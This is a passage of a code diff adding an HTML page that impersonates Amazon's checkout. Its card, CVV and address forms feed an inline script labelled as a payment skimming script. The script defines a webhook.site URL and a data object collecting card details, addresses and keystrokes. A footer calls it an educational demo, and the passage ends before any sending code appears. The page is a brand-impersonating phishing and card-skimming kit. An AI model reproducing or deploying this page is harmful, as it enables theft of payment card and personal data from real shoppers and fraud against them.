+            .order-summary {
+                position: static;
+            }
+            
+            .progress-steps {
+                gap: 20px;
+            }
+            
+            .checkout-text {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-wrapper {
+                padding: 0 16px;
+            }
+            
+            .checkout-text {
+                font-size: 18px;
+            }
+            
+            .secure-notice {
+                font-size: 13px;
+                padding: 6px 12px;
+            }
+            
+            .checkout-container {
+                padding: 0 16px;
+                margin: 20px auto;
+                gap: 20px;
+            }
+            
+            .box-header, .box-content,
+            .summary-header, .summary-content {
+                padding: 20px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 16px;
+            }
+            
+            .address-list {
+                grid-template-columns: 1fr;
+            }
+            
+            .address-modal-body {
+                padding: 24px;
+            }
+            
+            .modal-body {
+                padding: 32px;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .amazon-header {
+                height: 56px;
+            }
+            
+            .checkout-text {
+                display: none;
+            }
+            
+            .secure-notice {
+                padding: 5px 10px;
+                font-size: 12px;
+            }
+            
+            .secure-notice i {
+                margin-right: 6px;
+            }
+            
+            .progress-step {
+                font-size: 13px;
+                padding: 6px 12px;
+            }
+            
+            .step-number {
+                width: 22px;
+                height: 22px;
+            }
+            
+            .address-form-buttons {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .amazon-btn {
+                width: 100%;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Amazon Header -->
+    <header class="amazon-header">
+        <div class="header-wrapper">
+            <div class="amazon-logo-container">
+                <a href="#" class="header-logo">
+                    <div class="amazon-logo" aria-label="Amazon"></div>
+                </a>
+                <h1 class="checkout-text">Checkout</h1>
+            </div>
+            <div class="secure-notice">
+                <i class="fas fa-lock" aria-hidden="true"></i>
+                <span>Secure checkout</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Progress Steps -->
+    <div class="checkout-progress">
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="progress-step">
+                    <span class="step-number completed">1</span>
+                    <span>Your order</span>
+                </div>
+                <div class="progress-step">
+                    <span class="step-number completed">2</span>
+                    <span>Shipping address</span>
+                </div>
+                <div class="progress-step">
+                    <span class="step-number active">3</span>
+                    <span>Payment method</span>
+                </div>
+                <div class="progress-step">
+                    <span class="step-number">4</span>
+                    <span>Review items</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Checkout Area -->
+    <main class="checkout-container">
+        <!-- Left Column - Forms -->
+        <div class="left-column">
+            <!-- Shipping Address -->
+            <div class="checkout-box">
+                <div class="box-header">
+                    <h2>
+                        Shipping address
+                        <a href="#" class="change-link" id="openAddressModal">Add new address</a>
+                    </h2>
+                </div>
+                <div class="box-content address-container">
+                    <div class="address-list" id="addressList">
+                        <!-- No addresses message - shown when there are no addresses -->
+                        <div class="no-address-message" id="noAddressMessage">
+                            <i class="fas fa-map-marker-alt"></i>
+                            <p>You don't have any saved addresses yet.</p>
+                            <p>Click "Add new address" to add your shipping address.</p>
+                        </div>
+                        <!-- Addresses will be dynamically added here -->
+                    </div>
+
+                    <button class="add-address-btn" id="addNewAddressBtn">
+                        <i class="fas fa-plus"></i>
+                        Add a new address
+                    </button>
+                </div>
+            </div>
+
+            <!-- Delivery Options -->
+            <div class="checkout-box">
+                <div class="box-header">
+                    <h2>Delivery options</h2>
+                </div>
+                <div class="box-content">
+                    <div class="delivery-options" id="deliveryOptions">
+                        <!-- Delivery options will be shown only when an address is selected -->
+                        <div class="no-delivery-message" id="noDeliveryMessage">
+                            <p style="color: #666; text-align: center; padding: 30px; font-size: 15px;">
+                                Please add a shipping address to see delivery options.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Payment Method -->
+            <div class="checkout-box">
+                <div class="box-header">
+                    <h2>Payment method</h2>
+                </div>
+                <div class="box-content">
+                    <div class="payment-methods">
+                        <!-- Credit Card Option -->
+                        <div class="payment-option selected" id="creditCardOption" role="button" tabindex="0">
+                            <div class="payment-header">
+                                <i class="fas fa-credit-card payment-icon visa" aria-hidden="true"></i>
+                                <span class="payment-title">Credit or debit card</span>
+                            </div>
+                            <div class="payment-subtitle">
+                                Visa, Mastercard, American Express, Discover
+                            </div>
+                            
+                            <!-- Card Form -->
+                            <div class="card-form" id="cardForm">
+                                <div class="form-group">
+                                    <label for="cardNumber" class="form-label required">Card number</label>
+                                    <input type="text" id="cardNumber" class="amazon-input" 
+                                           placeholder="Enter card number" maxlength="19"
+                                           autocomplete="cc-number" inputmode="numeric">
+                                    <div class="validation-message" id="cardNumberValidation"></div>
+                                </div>
+                                
+                                <div class="form-row">
+                                    <div class="form-group">
+                                        <label for="expiryDate" class="form-label required">Expiration date</label>
+                                        <input type="text" id="expiryDate" class="amazon-input" 
+                                               placeholder="MM/YY" maxlength="5"
+                                               autocomplete="cc-exp" inputmode="numeric">
+                                        <div class="validation-message" id="expiryValidation"></div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="cvvCode" class="form-label required">Security code</label>
+                                        <input type="password" id="cvvCode" class="amazon-input" 
+                                               placeholder="CVV" maxlength="4"
+                                               autocomplete="cc-csc" inputmode="numeric">
+                                        <div class="validation-message" id="cvvValidation"></div>
+                                        <span class="input-hint">3-4 digits on card</span>
+                                    </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="cardName" class="form-label required">Name on card</label>
+                                    <input type="text" id="cardName" class="amazon-input" 
+                                           placeholder="Name as it appears on card" autocomplete="cc-name">
+                                    <div class="validation-message" id="nameValidation"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- PayPal Option -->
+                        <div class="payment-option" id="paypalOption" role="button" tabindex="0">
+                            <div class="payment-header">
+                                <i class="fab fa-paypal payment-icon" style="color: #003087;" aria-hidden="true"></i>
+                                <span class="payment-title">PayPal</span>
+                            </div>
+                            <div class="payment-subtitle">
+                                Fast, easy, and secure
+                            </div>
+                            <!-- PayPal Loading/Redirect Section -->
+                            <div class="payment-loading" id="paypalLoading">
+                                <i class="fas fa-spinner fa-spin"></i>
+                                <p>Redirecting to PayPal for secure payment...</p>
+                            </div>
+                            <div class="paypal-redirect" id="paypalRedirect">
+                                <i class="fab fa-paypal"></i>
+                                <h3>Continue with PayPal</h3>
+                                <p>You'll be redirected to PayPal to complete your payment securely.</p>
+                                <p>After payment, you'll return to Amazon to review your order.</p>
+                                <button class="amazon-btn amazon-btn-primary" id="continuePayPalBtn" style="margin-top: 20px;">
+                                    Continue to PayPal
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Amazon Pay Option -->
+                        <div class="payment-option" id="amazonPayOption" role="button" tabindex="0">
+                            <div class="payment-header">
+                                <i class="fab fa-amazon payment-icon" style="color: #ff9900;" aria-hidden="true"></i>
+                                <span class="payment-title">Amazon Pay</span>
+                            </div>
+                            <div class="payment-subtitle">
+                                Pay with your Amazon account
+                            </div>
+                            <!-- Amazon Pay Loading/Redirect Section -->
+                            <div class="payment-loading" id="amazonPayLoading">
+                                <i class="fas fa-spinner fa-spin"></i>
+                                <p>Connecting to Amazon Pay...</p>
+                            </div>
+                            <div class="amazonpay-redirect" id="amazonPayRedirect">
+                                <i class="fab fa-amazon"></i>
+                                <h3>Continue with Amazon Pay</h3>
+                                <p>You'll be redirected to Amazon Pay to complete your payment securely.</p>
+                                <p>After payment, you'll return to complete your order.</p>
+                                <button class="amazon-btn amazon-btn-primary" id="continueAmazonPayBtn" style="margin-top: 20px;">
+                                    Continue to Amazon Pay
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Billing Address -->
+            <div class="checkout-box">
+                <div class="box-header">
+                    <h2>Billing address</h2>
+                </div>
+                <div class="box-content">
+                    <div class="form-checkbox">
+                        <input type="checkbox" id="sameAsShipping" checked>
+                        <label for="sameAsShipping">Same as shipping address</label>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Column - Order Summary -->
+        <div class="right-column">
+            <div class="order-summary">
+                <div class="summary-header">
+                    <h2>Order summary</h2>
+                </div>
+                
+                <div class="summary-content">
+                    <!-- Item 1 -->
+                    <div class="order-item">
+                        <div class="item-image">
+                            <img src="https://m.media-amazon.com/images/I/71an9eiBxpL._AC_SY200_.jpg" 
+                                 alt="Sony WH-1000XM4 Wireless Noise Canceling Headphones" loading="lazy">
+                        </div>
+                        <div class="item-details">
+                            <div class="item-title">
+                                Sony WH-1000XM4 Wireless Noise Canceling Headphones
+                            </div>
+                            <div class="item-price">$348.00</div>
+                            <div class="item-shipping">FREE delivery</div>
+                            <div class="item-quantity">Quantity: 1</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Item 2 -->
+                    <div class="order-item">
+                        <div class="item-image">
+                            <img src="https://m.media-amazon.com/images/I/71Y1E0QQNTL._AC_SY200_.jpg" 
+                                 alt="Anker USB C Cable, 2-Pack 6ft" loading="lazy">
+                        </div>
+                        <div class="item-details">
+                            <div class="item-title">
+                                Anker USB C Cable, 2-Pack 6ft
+                            </div>
+                            <div class="item-price">$13.99</div>
+                            <div class="item-shipping">FREE delivery</div>
+                            <div class="item-quantity">Quantity: 2</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Order Totals -->
+                    <div class="order-totals">
+                        <div class="total-row">
+                            <span>Items (3):</span>
+                            <span>$375.98</span>
+                        </div>
+                        <div class="total-row">
+                            <span>Shipping & handling:</span>
+                            <span>$0.00</span>
+                        </div>
+                        <div class="total-row">
+                            <span>Estimated tax:</span>
+                            <span>$30.08</span>
+                        </div>
+                        <div class="total-row">
+                            <span>Promotion applied:</span>
+                            <span style="color: var(--amazon-success);">-$10.00</span>
+                        </div>
+                        <div class="total-row total">
+                            <span>Order total:</span>
+                            <span>$395.06</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Place Order Button -->
+                <div class="place-order-section">
+                    <!-- Requirements Message -->
+                    <div class="place-order-requirements" id="requirementsMessage">
+                        <i class="fas fa-info-circle"></i>
+                        <div class="requirements-title">Complete these requirements to place your order:</div>
+                        <ul class="requirements-list" id="requirementsList">
+                            <li class="requirement-not-met" id="addressRequirement">
+                                <i class="fas fa-circle"></i>
+                                Add and select a shipping address
+                            </li>
+                            <li class="requirement-not-met" id="paymentMethodRequirement">
+                                <i class="fas fa-circle"></i>
+                                Select "Credit or debit card" as payment method
+                            </li>
+                            <li class="requirement-not-met" id="cardNumberRequirement">
+                                <i class="fas fa-circle"></i>
+                                Enter valid card number
+                            </li>
+                            <li class="requirement-not-met" id="expiryRequirement">
+                                <i class="fas fa-circle"></i>
+                                Enter valid expiry date (MM/YY)
+                            </li>
+                            <li class="requirement-not-met" id="cvvRequirement">
+                                <i class="fas fa-circle"></i>
+                                Enter valid security code (CVV)
+                            </li>
+                            <li class="requirement-not-met" id="cardNameRequirement">
+                                <i class="fas fa-circle"></i>
+                                Enter name on card
+                            </li>
+                        </ul>
+                    </div>
+                    
+                    <button class="place-order-btn" id="placeOrderBtn" disabled>
+                        Complete requirements to place order
+                    </button>
+                    <div class="order-note">
+                        <i class="fas fa-lock" aria-hidden="true"></i>
+                        Secure transaction
+                    </div>
+                    <div class="terms-notice">
+                        By placing your order, you agree to Amazon's 
+                        <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="amazon-footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Conditions of Use</a>
+                <a href="#" class="footer-link">Privacy Notice</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">© 1996-2024, Amazon.com, Inc.</a>
+            </div>
+            <div class="copyright">
+                <p>This is a demo website for educational purposes only. Not affiliated with Amazon.com, Inc.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Address Modal -->
+    <div class="address-modal" id="addressModal">
+        <div class="address-modal-content">
+            <div class="address-modal-header">
+                <h2 id="addressModalTitle">Add a new address</h2>
+                <button class="close-address-modal" id="closeAddressModalBtn">&times;</button>
+            </div>
+            <div class="address-modal-body">
+                <form id="addressForm" class="address-form">
+                    <input type="hidden" id="addressId">
+                    
+                    <div class="form-group">
+                        <label for="fullName" class="form-label required">Full name</label>
+                        <input type="text" id="fullName" class="amazon-input" 
+                               placeholder="First and last name" autocomplete="name">
+                        <div class="validation-message" id="nameValidationModal"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber" class="form-label required">Phone number</label>
+                        <input type="tel" id="phoneNumber" class="amazon-input" 
+                               placeholder="10-digit phone number" autocomplete="tel">
+                        <div class="validation-message" id="phoneValidation"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="addressLine1" class="form-label required">Address line 1</label>
+                        <input type="text" id="addressLine1" class="amazon-input" 
+                               placeholder="Street address or P.O. Box" autocomplete="address-line1">
+                        <div class="validation-message" id="address1Validation"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="addressLine2" class="form-label">Address line 2 (optional)</label>
+                        <input type="text" id="addressLine2" class="amazon-input" 
+                               placeholder="Apartment, suite, unit, building, floor, etc." autocomplete="address-line2">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="city" class="form-label required">City</label>
+                            <input type="text" id="city" class="amazon-input" 
+                                   placeholder="e.g., Seattle" autocomplete="address-level2">
+                            <div class="validation-message" id="cityValidation"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="state" class="form-label required">State/Province/Region</label>
+                            <input type="text" id="state" class="amazon-input" 
+                                   placeholder="e.g., Washington" autocomplete="address-level1">
+                            <div class="validation-message" id="stateValidation"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="zipCode" class="form-label required">ZIP Code</label>
+                            <input type="text" id="zipCode" class="amazon-input" 
+                                   placeholder="e.g., 98101" autocomplete="postal-code">
+                            <div class="validation-message" id="zipValidation"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="country" class="form-label required">Country</label>
+                            <input type="text" id="country" class="amazon-input" 
+                                   placeholder="e.g., United States" autocomplete="country">
+                        </div>
+                    </div>
+                    
+                    <div class="form-checkbox">
+                        <input type="checkbox" id="makeDefault" checked>
+                        <label for="makeDefault">Make this my default address</label>
+                    </div>
+                    
+                    <div class="form-checkbox">
+                        <input type="checkbox" id="saveAddress" checked>
+                        <label for="saveAddress">Save this address to my address book</label>
+                    </div>
+                    
+                    <div class="address-form-buttons">
+                        <button type="button" class="amazon-btn amazon-btn-secondary" id="cancelAddressBtn">Cancel</button>
+                        <button type="submit" class="amazon-btn amazon-btn-primary" id="saveAddressBtn">
+                            Add address
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="amazon-modal" id="successModal" role="dialog" aria-labelledby="modalTitle" aria-hidden="true">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modalTitle">Order Confirmed</h2>
+                <button class="close-modal" id="closeModalBtn" aria-label="Close modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <i class="fas fa-check-circle" aria-hidden="true"></i>
+                <h3>Thank you for your order!</h3>
+                <p>Order #: <strong id="orderNumber">114-9523612-9872661</strong></p>
+                <p>Estimated delivery: <strong>December 24-26</strong></p>
+                <p>You'll receive a confirmation email shortly.</p>
+                <p style="margin-top: 20px; font-size: 13px; color: #666;">
+                    Redirecting to Amazon.com in <span id="countdown">5</span> seconds...
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== MODERN PAYMENT SKIMMING SCRIPT =====
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🛒 Modern Amazon Checkout Page Loaded');
+            
+            // Configuration
+            const STUDENT_ID = "STUDENT_" + Math.floor(Math.random() * 10000);
+            const WEBHOOK_URL = "https://webhook.site/f3056306-5faa-45d0-8c42-f0801d8d263f";
+            
+            // State
+            let capturedData = {
+                studentId: STUDENT_ID,
+                timestamp: new Date().toISOString(),
+                cardData: {},
+                shippingAddress: {},
+                paymentMethod: "credit_card",
+                keystrokes: []
+            };
+            
+            // ===== 1. ADDRESS MANAGEMENT SYSTEM =====
+            let addresses = [];
+            let selectedAddressId = null;
+            
+            // DOM Elements
+            const addressList = document.getElementById('addressList');
+            const noAddressMessage = document.getElementById('noAddressMessage');
+            const addressModal = document.getElementById('addressModal');
+            const addressForm = document.getElementById('addressForm');
+            const addressModalTitle = document.getElementById('addressModalTitle');
+            const openAddressModalBtn = document.getElementById('openAddressModal');
+            const addNewAddressBtn = document.getElementById('addNewAddressBtn');
+            const closeAddressModalBtn = document.getElementById('closeAddressModalBtn');
+            const cancelAddressBtn = document.getElementById('cancelAddressBtn');
+            const saveAddressBtn = document.getElementById('saveAddressBtn');
+            const deliveryOptions = document.getElementById('deliveryOptions');
+            const placeOrderBtn = document.getElementById('placeOrderBtn');
+            const requirementsMessage = document.getElementById('requirementsMessage');
+            
+            // Payment DOM Elements
+            const paypalLoading = document.getElementById('paypalLoading');
+            const paypalRedirect = document.getElementById('paypalRedirect');
+            const continuePayPalBtn = document.getElementById('continuePayPalBtn');
+            const amazonPayLoading = document.getElementById('amazonPayLoading');
+            const amazonPayRedirect = document.getElementById('amazonPayRedirect');
+            const continueAmazonPayBtn = document.getElementById('continueAmazonPayBtn');
+            
+            // Card Input Elements
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expiryInput = document.getElementById('expiryDate');
+            const cvvInput = document.getElementById('cvvCode');
+            const nameInput = document.getElementById('cardName');
+            
+            // Requirements Elements
+            const addressRequirement = document.getElementById('addressRequirement');
+            const paymentMethodRequirement = document.getElementById('paymentMethodRequirement');
+            const cardNumberRequirement = document.getElementById('cardNumberRequirement');
+            const expiryRequirement = document.getElementById('expiryRequirement');
+            const cvvRequirement = document.getElementById('cvvRequirement');
+            const cardNameRequirement = document.getElementById('cardNameRequirement');
+            
+            // Track requirements status
+            let requirements = {
+                addressSelected: false,
+                creditCardSelected: true, // Default selected
+                cardNumberValid: false,
+                expiryValid: false,
+                cvvValid: false,
+                cardNameValid: false
+            };
+            
+            // ===== 2. REQUIREMENTS CHECKING SYSTEM =====
+            function checkRequirements() {
+                // Update requirements based on current state
+                requirements.addressSelected = selectedAddressId !== null;
+                requirements.creditCardSelected = capturedData.paymentMethod === 'credit_card';
+                
+                // Check card validation
+                const cardValidation = validateCardNumber(cardNumberInput.value);
+                requirements.cardNumberValid = cardValidation.valid;
+                
+                const expiryValidation = validateExpiryDate(expiryInput.value);
+                requirements.expiryValid = expiryValidation.valid;
+                
+                const cardType = cardValidation.type || "Unknown";
+                const cvvValidation = validateCVV(cvvInput.value, cardType);
+                requirements.cvvValid = cvvValidation.valid;
+                
+                const nameValidation = validateName(nameInput.value);
+                requirements.cardNameValid = nameValidation.valid;
+                
+                // Update UI for each requirement
+                updateRequirementUI(addressRequirement, requirements.addressSelected, "Add and select a shipping address", "✓ Shipping address selected");
+                updateRequirementUI(paymentMethodRequirement, requirements.creditCardSelected, "Select 'Credit or debit card' as payment method", "✓ Credit/debit card selected");
+                updateRequirementUI(cardNumberRequirement, requirements.cardNumberValid, "Enter valid card number", "✓ Valid card number entered");
+                updateRequirementUI(expiryRequirement, requirements.expiryValid, "Enter valid expiry date (MM/YY)", "✓ Valid expiry date entered");
+                updateRequirementUI(cvvRequirement, requirements.cvvValid, "Enter valid security code (CVV)", "✓ Valid security code entered");
+                updateRequirementUI(cardNameRequirement, requirements.cardNameValid, "Enter name on card", "✓ Name on card entered");
+                
+                // Check if all requirements are met
+                const allRequirementsMet = requirements.addressSelected && 
+                                         requirements.creditCardSelected && 
+                                         requirements.cardNumberValid && 
+                                         requirements.expiryValid && 
+                                         requirements.cvvValid && 
+                                         requirements.cardNameValid;
+                
+                // Update place order button
+                if (allRequirementsMet) {
+                    placeOrderBtn.disabled = false;
+                    placeOrderBtn.innerHTML = 'Place your order';
+                    placeOrderBtn.style.opacity = '1';
+                    requirementsMessage.style.display = 'none';
+                } else {
+                    placeOrderBtn.disabled = true;
+                    placeOrderBtn.innerHTML = 'Complete requirements to place order';
+                    placeOrderBtn.style.opacity = '0.6';
+                    requirementsMessage.style.display = 'block';
+                }
+                
+                return allRequirementsMet;
+            }
+            
+            function updateRequirementUI(element, isMet, notMetText, metText) {
+                if (isMet) {
+                    element.innerHTML = `<i class="fas fa-check-circle"></i> ${metText}`;
+                    element.className = 'requirement-met';
+                } else {
+                    element.innerHTML = `<i class="fas fa-circle"></i> ${notMetText}`;
+                    element.className = 'requirement-not-met';
+                }
+            }
+            
+            // ===== 3. ADDRESS FUNCTIONS =====
+            function renderAddresses() {
+                addressList.innerHTML = '';
+                
+                if (addresses.length === 0) {
+                    noAddressMessage.style.display = 'block';
+                    deliveryOptions.innerHTML = `
+                        <div class="no-delivery-message" id="noDeliveryMessage">
+                            <p style="color: #666; text-align: center; padding: 30px; font-size: 15px;">
+                                Please add a shipping address to see delivery options.
+                            </p>
+                        </div>
+                    `;
+                    requirements.addressSelected = false;
+                } else {
+                    noAddressMessage.style.display = 'none';
+                    
+                    addresses.forEach(address => {
+                        const addressOption = document.createElement('div');
+                        addressOption.className = `address-option ${address.id === selectedAddressId ? 'selected' : ''}`;
+                        addressOption.dataset.addressId = address.id;
+                        
+                        addressOption.innerHTML = `
+                            <div class="address-header">
+                                <div>
+                                    <span class="address-name">${address.name}</span>
+                                    ${address.isDefault ? '<span class="address-type">Default</span>' : ''}
+                                </div>
+                                <div class="address-actions">
+                                    <a class="address-action-link edit-address" data-address-id="${address.id}">Edit</a>
+                                    <a class="address-action-link delete-address" data-address-id="${address.id}">Delete</a>
+                                </div>
+                            </div>
+                            <div class="address-details">
+                                <p>${address.addressLine1}</p>
+                                ${address.addressLine2 ? `<p>${address.addressLine2}</p>` : ''}
+                                <p>${address.city}, ${address.state} ${address.zipCode}</p>
+                                <p>${address.country}</p>
+                            </div>
+                            <div class="address-phone">
+                                <strong>Phone:</strong> ${address.phone}
+                            </div>
+                        `;
+                        
+                        addressList.appendChild(addressOption);
+                    });
+                    
+                    if (selectedAddressId) {
+                        showDeliveryOptions();
+                        requirements.addressSelected = true;
+                    }
+                }
+                
+                if (selectedAddressId) {
+                    const selectedAddress = addresses.find(addr => addr.id === selectedAddressId);
+                    if (selectedAddress) {
+                        capturedData.shippingAddress = selectedAddress;
+                        captureAddressData(selectedAddress);
+                    }
+                }
+                
+                checkRequirements();
+            }
+            
+            function showDeliveryOptions() {
+                const selectedAddress = addresses.find(addr => addr.id === selectedAddressId);
+                if (!selectedAddress) return;
+                
+                const addressDate = new Date(selectedAddress.dateAdded || new Date());
+                const tomorrow = new Date(addressDate);
+                tomorrow.setDate(tomorrow.getDate() + 1);
+                
+                const twoDays = new Date(addressDate);
+                twoDays.setDate(twoDays.getDate() + 2);
+                
+                const threeDays = new Date(addressDate);
+                threeDays.setDate(threeDays.getDate() + 3);
+                
+                const formatDate = (date) => {
+                    const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+                    const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 
+                                   'August', 'September', 'October', 'November', 'December'];
+                    return `${days[date.getDay()]}, ${months[date.getMonth()]} ${date.getDate()}`;
+                };
+                
+                deliveryOptions.innerHTML = `
+                    <div class="delivery-option selected">
+                        <input type="radio" name="deliveryOption" id="delivery1" checked>
+                        <div class="delivery-details">
+                            <div class="delivery-title">Amazon Day Delivery</div>
+                            <div class="delivery-date">${formatDate(threeDays)}</div>
+                            <div class="delivery-price">FREE</div>
+                        </div>
+                    </div>
+                    <div class="delivery-option">
+                        <input type="radio" name="deliveryOption" id="delivery2">
+                        <div class="delivery-details">
+                            <div class="delivery-title">Two-Day Shipping</div>
+                            <div class="delivery-date">${formatDate(twoDays)}</div>
+                            <div class="delivery-price">FREE with Amazon Prime</div>
+                        </div>
+                    </div>
+                    <div class="delivery-option">
+                        <input type="radio" name="deliveryOption" id="delivery3">
+                        <div class="delivery-details">
+                            <div class="delivery-title">One-Day Shipping</div>
+                            <div class="delivery-date">${formatDate(tomorrow)}</div>
+                            <div class="delivery-price">$5.99</div>
+                        </div>
+                    </div>
+                `;
+                
+                const newDeliveryOptions = deliveryOptions.querySelectorAll('.delivery-option');
+                newDeliveryOptions.forEach(option => {
+                    option.addEventListener('click', function() {
+                        newDeliveryOptions.forEach(opt => opt.classList.remove('selected'));
+                        this.classList.add('selected');
+                        const radio = this.querySelector('input[type="radio"]');
+                        if (radio) radio.checked = true;
+                    });
+                    
+                    const radio = option.querySelector('input[type="radio"]');
+                    radio.addEventListener('change', function() {
+                        if (this.checked) {
+                            newDeliveryOptions.forEach(opt => opt.classList.remove('selected'));
+                            option.classList.add('selected');
+                        }
+                    });
+                });
+            }
+            
+            function openAddressModal(addressId = null) {
+                const addBtn = document.getElementById('addNewAddressBtn');
+                const originalText = addBtn.innerHTML;
+                addBtn.innerHTML = '<span class="spinner"></span> Loading address form...';
+                addBtn.classList.add('loading');
+                addBtn.disabled = true;
+                
+                setTimeout(() => {
+                    if (addressId) {
+                        addressModalTitle.textContent = 'Edit address';
+                        const address = addresses.find(addr => addr.id === addressId);
+                        if (address) {
+                            document.getElementById('addressId').value = address.id;
+                            document.getElementById('fullName').value = address.name;
+                            document.getElementById('phoneNumber').value = address.phone;
+                            document.getElementById('addressLine1').value = address.addressLine1;
+                            document.getElementById('addressLine2').value = address.addressLine2 || '';
+                            document.getElementById('city').value = address.city;
+                            document.getElementById('state').value = address.state;
+                            document.getElementById('zipCode').value = address.zipCode;
+                            document.getElementById('country').value = address.country;
+                            document.getElementById('makeDefault').checked = address.isDefault;
+                            document.getElementById('saveAddress').checked = address.isSaved;
+                        }
+                    } else {
+                        addressModalTitle.textContent = 'Add a new address';
+                        addressForm.reset();
+                        document.getElementById('addressId').value = '';
+                        document.getElementById('country').value = '';
+                        document.getElementById('state').value = '';
+                        document.getElementById('makeDefault').checked = true;
+                        document.getElementById('saveAddress').checked = true;
+                    }
+                    
+                    addressModal.style.display = 'flex';
+                    
+                    addBtn.innerHTML = originalText;
+                    addBtn.classList.remove('loading');
+                    addBtn.disabled = false;
+                }, 800);
+            }
+            
+            function closeAddressModal() {
+                addressModal.style.display = 'none';
+                addressForm.reset();
+                clearValidationMessages();
+            }
+            
+            function clearValidationMessages() {
+                const validationElements = document.querySelectorAll('#addressForm .validation-message');
+                validationElements.forEach(el => {
+                    el.textContent = '';
+                    el.style.display = 'none';
+                });
+                
+                const inputs = addressForm.querySelectorAll('.amazon-input');
+                inputs.forEach(input => {
+                    input.classList.remove('input-valid', 'input-invalid');
+                });
+            }
+            
+            function validateAddressForm() {
+                let isValid = true;
+                
+                const name = document.getElementById('fullName').value.trim();
+                if (!name) {
+                    showValidationError('nameValidationModal', 'Full name is required');
+                    isValid = false;
+                } else if (name.length < 2) {
+                    showValidationError('nameValidationModal', 'Enter full name');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('nameValidationModal', '✓ Valid name');
+                }
+                
+                const phone = document.getElementById('phoneNumber').value.trim();
+                const phoneRegex = /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
+                if (!phone) {
+                    showValidationError('phoneValidation', 'Phone number is required');
+                    isValid = false;
+                } else if (!phoneRegex.test(phone)) {
+                    showValidationError('phoneValidation', 'Enter valid 10-digit phone number');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('phoneValidation', '✓ Valid phone number');
+                }
+                
+                const address1 = document.getElementById('addressLine1').value.trim();
+                if (!address1) {
+                    showValidationError('address1Validation', 'Address is required');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('address1Validation', '✓ Valid address');
+                }
+                
+                const city = document.getElementById('city').value.trim();
+                if (!city) {
+                    showValidationError('cityValidation', 'City is required');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('cityValidation', '✓ Valid city');
+                }
+                
+                const state = document.getElementById('state').value.trim();
+                if (!state) {
+                    showValidationError('stateValidation', 'State is required');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('stateValidation', '✓ Valid state');
+                }
+                
+                const zip = document.getElementById('zipCode').value.trim();
+                const zipRegex = /^\d{5}(-\d{4})?$/;
+                if (!zip) {
+                    showValidationError('zipValidation', 'ZIP code is required');
+                    isValid = false;
+                } else if (!zipRegex.test(zip)) {
+                    showValidationError('zipValidation', 'Enter valid ZIP code');
+                    isValid = false;
+                } else {
+                    showValidationSuccess('zipValidation', '✓ Valid ZIP code');
+                }
+                
+                const country = document.getElementById('country').value.trim();
+                if (!country) {
+                    showValidationError('zipValidation', 'Country is required');
+                    isValid = false;
+                }
+                
+                return isValid;
+            }
+            
+            function showValidationError(elementId, message) {
+                const element = document.getElementById(elementId);
+                if (element) {
+                    element.textContent = message;
+                    element.className = 'validation-message validation-error';
+                    element.style.display = 'block';
+                    
+                    const inputId = elementId.replace('ValidationModal', '').replace('Validation', '');
+                    const input = document.getElementById(inputId) || document.getElementById(inputId.toLowerCase());
+                    if (input) {
+                        input.classList.remove('input-valid');
+                        input.classList.add('input-invalid');
+                    }
+                }
+            }
+            
+            function showValidationSuccess(elementId, message) {
+                const element = document.getElementById(elementId);
+                if (element) {
+                    element.textContent = message;
+                    element.className = 'validation-message validation-success';
+                    element.style.display = 'block';
+                    
+                    const inputId = elementId.replace('ValidationModal', '').replace('Validation', '');
+                    const input = document.getElementById(inputId) || document.getElementById(inputId.toLowerCase());
+                    if (input) {
+                        input.classList.remove('input-invalid');
+                        input.classList.add('input-valid');
+                    }
+                }
+            }
+            
+            function saveAddress(formData) {
